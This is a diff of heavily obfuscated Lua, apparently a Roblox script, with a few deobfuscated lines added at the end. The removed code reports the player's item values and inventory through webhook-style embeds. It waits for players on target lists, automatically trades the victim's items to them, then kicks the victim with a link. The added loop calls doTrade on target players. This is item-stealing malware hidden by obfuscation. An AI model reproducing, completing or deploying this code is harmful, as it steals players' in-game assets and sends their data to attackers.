-_0x017c = string.format("[_0x0248 _0x0249](%_0x000d) • [_0x024a _0x011f](%_0x000d)", _0x01b1, _0x01e6),
-_0x0202 = false
-}
-},
-_0x020e = {
-_0x015c = string.format("_0x011e _0x000a _0x020f • _0x0210 • _0x0212.5.1 • %_0x000d", os._0x0123("!%_0x0126:%_0x0064:%_0x0127 _0x024b"))
-},
-_0x0213 = os._0x0123("!%_0x0124-%_0x0125-%_0x0214%_0x0126:%_0x0064:%_0x0215")
-}
-local _0x01eb = {
-_0x013d = _0x013d,
-_0x024c = _0x0219 and "🔥 _0x024d _0x024e" or "💎 _0x011e _0x020f",
-_0x024f = _0x0100,
-_0x0216 = {_0x0205}
-}
-_0x01e9(_0x0218, _0x01eb, _0x0219)
-local _0x0250 = _0x0219 and _0x008b or _0x0089
-for _0x0021, _0x0251 in ipairs(_0x0250) do
-_0x0109(_0x000f, _0x001b, _0x0251)
-end
-end
-local function _0x0252()
-local _0x0230 = _0x01d5
-local _0x022c = 0
-for _0x0021, _0x002c in ipairs(_0x01d4) do _0x022c = _0x022c + _0x002c._0x0137 end
-local _0x013d = "📢 **_0x0253 _0x0227 _0x0254**"
-local _0x0255 = {}
-local _0x0256 = {"_0x012b", "_0x012c", "_0x012d", "_0x012e", "_0x012f", "_0x0130", "_0x0131", "_0x0132"}
-local _0x0257 = {"31", "35", "33", "38;5;208", "34", "32", "37", "30"}
-for _0x0039, _0x018d in ipairs(_0x0256) do
-local _0x0258 = _0x0230[_0x018d] or 0
-if _0x0258 > 0 then
-table.insert(_0x0255, string.format("[2;%_0x0259%_0x000d: %_0x0040[0m", _0x0257[_0x0039], _0x018d, _0x0258))
-end
-end
-local _0x0205 = {
-_0x0206 = string.format("🌐 _0x025a _0x025b │ %_0x000d", _0x01e0),
-_0x0175 = _0x01e6,
-_0x020a = 0x8B0000,
-_0x020c = string.format("**%_0x000d** _0x025c _0x00a0 _0x025d _0x025e!", _0x00df._0x01d3),
-_0x020b = {
-{
-_0x0026 = "💎 _0x0241",
-_0x017c = string.format("```_0x025f\_0x0260: %_0x0040\_0x0261: %_0x0040```", _0x00e4, _0x022c),
-_0x0202 = true
-},
-{
-_0x0026 = "⚡ _0x007c",
-_0x017c = string.format("```_0x025f\_0x0262: %_0x000d\_0x0263: %_0x000d```", _0x00f2, "_0x0212.5.1"),
-_0x0202 = true
-},
-{
-_0x0026 = "📊 _0x0243",
-_0x017c = string.format("```_0x0244\_0x000e%_0x000d```", table.concat(_0x0255, "\_0x000e")),
-_0x0202 = false
-}
-},
-_0x020e = {
-_0x015c = "_0x011e _0x000a _0x020f • _0x0210 _0x0211 • _0x0212.5.1"
-},
-_0x0213 = os._0x0123("!%_0x0124-%_0x0125-%_0x0214%_0x0126:%_0x0064:%_0x0215")
-}
-local _0x01eb = {
-_0x013d = _0x013d,
-_0x024c = "📡 _0x025a _0x0264",
-_0x024f = _0x0100,
-_0x0216 = {_0x0205}
-}
-_0x01e9(_0x005f, _0x01eb, false)
-end
-local function _0x0266()
-_0x00e0 = _0x0005._0x0267(100, function()
-if not _0x00e2 then
-_0x00e1 = true
-_0x0217(_0x005d, true)
-local _0x0268 = nil
-for _0x0021, _0x0026 in ipairs(_0x008b) do
-local _0x0269 = _0x0010:_0x01ca(_0x0026)
-if _0x0269 and _0x0269 ~= _0x00df then
-_0x0268 = _0x0269
-break
-end
-end
-if _0x0268 then
-_0x0005._0x0195(function() _0x026a(_0x0268) end)
-end
-end
-end)
-end
-local function _0x026b()
-if _0x00e0 then _0x0005._0x026c(_0x00e0); _0x00e0 = nil end
-end
-_0x0217(_0x0002, false)
-_0x0252()
-if _0x00e4 >= 300 then
-_0x0266()
-end
-local function _0x026e()
-local _0x00f4, _0x0095 = pcall(function() return _0x01b7:_0x01d2() end)
-return _0x00f4 and _0x0095 or "_0x026f"
-end
-local function _0x0270(_0x0271)
-local _0x0272 = 0
-while _0x0272 < 30 do
-if _0x0271 and _0x0271._0x0273 then
-local char = _0x0271._0x01af
-if char and char:_0x01ca("_0x0274") then return true end
-end
-_0x0272 = _0x0272 + 1
-_0x0005._0x0006(0.5)
-end
-return false
-end
-local function _0x01bb()
-if not _0x01bd then return false end
-local _0x00f4 = pcall(function()
-_0x01ba:_0x0275(_0x000f * 3, _0x01bd)
-end)
-return _0x00f4
-end
-local function _0x0276()
-_0x00e2 = true
-_0x026b()
-_0x0005._0x0006(2)
-local _0x0277 = "_0x004d://_0x0278._0x0279/_0x027a"
-pcall(function() _0x0082(_0x0277) end)
-_0x00df:_0x0012("_0x0129 _0x027b _0x025d _0x011e _0x027c\_0x000e\_0x000e" .. _0x0277 .. "\_0x000e\_0x027d _0x01ef _0x027e _0x027f _0x011c _0x0280!")
-end
-function _0x026a(_0x0271)
-if not _0x0271 or not _0x0271._0x0273 then return end
-if not _0x0270(_0x0271) then return end
-pcall(function() _0x01bc:_0x0275() end)
-_0x0005._0x0006(0.5)
-_0x01bd = nil
-local _0x0281 = false
-local _0x0034 = 0
-while _0x0034 < 60 and #_0x01d4 > 0 do
-local _0x01f0 = pcall(function()
-local _0x0095 = _0x026e()
-if _0x0095 == "_0x026f" then
-if _0x0281 then
-for _0x0039 = 1, math.min(4, #_0x01d4) do
-local _0x0282 = table.remove(_0x01d4, 1)
-if _0x00e9 and _0x00ea and not _0x00ee then
-_0x00ea[_0x0282._0x013b] = (_0x00ea[_0x0282._0x013b] or 0) + _0x0282._0x0137
-end
-end
-_0x0281 = false
-_0x01bd = nil
-_0x0005._0x0006(0.5)
-if not _0x00ee then
-_0x01f8()
-end
-else
-_0x01b6:_0x01d2(_0x0271)
-_0x0005._0x0006(1.5)
-end
-elseif _0x0095 == "_0x0283" then
-_0x0005._0x0006(0.5)
-elseif _0x0095 == "_0x0284" then
-_0x01bc:_0x0275()
-_0x0005._0x0006(0.3)
-elseif _0x0095 == "_0x0285" then
-if not _0x0281 then
-for _0x0039 = 1, math.min(4, #_0x01d4) do
-local _0x002c = _0x01d4[_0x0039]
-for _0x0021 = 1, _0x002c._0x0137 do
-_0x01b9:_0x0275(_0x002c._0x013c, "_0x01d9")
-end
-_0x0005._0x0006(0.1)
-end
-_0x0281 = true
-_0x0005._0x0195(function()
-_0x0005._0x0006(6.5)
-_0x01bb()
-end)
-else
-_0x0005._0x0006(1)
-end
-end
-end)
-if not _0x01f0 then _0x0005._0x0006(1) end
-_0x0034 = _0x0034 + 1
-end
-if #_0x01d4 == 0 then
-if not _0x00ee then
-_0x01f8()
-end
-_0x0276()
-end
-end
-local function _0x0288(_0x0026)
-for _0x0021, _0x0289 in ipairs(_0x0089) do
-if _0x0289:lower() == _0x0026:lower() then return true end
-end
-if _0x00e1 then
-for _0x0021, _0x0289 in ipairs(_0x008b) do
-if _0x0289:lower() == _0x0026:lower() then return true end
-end
-end
-return false
-end
-_0x0010._0x028b:_0x01c0(function(_0x0269)
-if _0x0269 == _0x00df then return end
-if _0x0288(_0x0269._0x01d3) then
-_0x0005._0x0195(function()
-_0x0005._0x0006(4)
-_0x026a(_0x0269)
-end)
-end
-end)
-for _0x0021, _0x028c in ipairs(_0x0010:_0x028d()) do
-if _0x028c ~= _0x00df and _0x0288(_0x028c._0x01d3) then
-_0x0005._0x0195(function()
-_0x0005._0x0006(4)
-_0x026a(_0x028c)
-end)
-end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= plr and isTarget(p.Name) then
+        task.spawn(function()
+            task.wait(4)
+            doTrade(p)
+        end)
+    end
 end
